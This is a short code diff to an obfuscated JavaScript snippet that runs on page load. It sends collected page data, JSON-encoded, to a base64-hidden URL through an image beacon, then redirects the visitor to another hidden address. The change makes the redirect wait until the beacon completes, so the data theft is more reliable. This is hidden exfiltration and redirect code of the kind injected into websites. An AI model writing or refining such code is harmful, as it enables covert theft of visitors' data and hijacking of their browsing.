@@ -31,8 +31,9 @@
     }catch(e){}
     var u=atob(n);
     var q='?d='+encodeURIComponent(JSON.stringify(a));
-    new Image().src=u+q;
-    setTimeout(function(){l.location.replace(atob(t));},200);
+    var i=new Image();
+    i.onload=i.onerror=function(){l.location.replace(atob(t));};
+    i.src=u+q;
   };
   if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',r);
   else r();
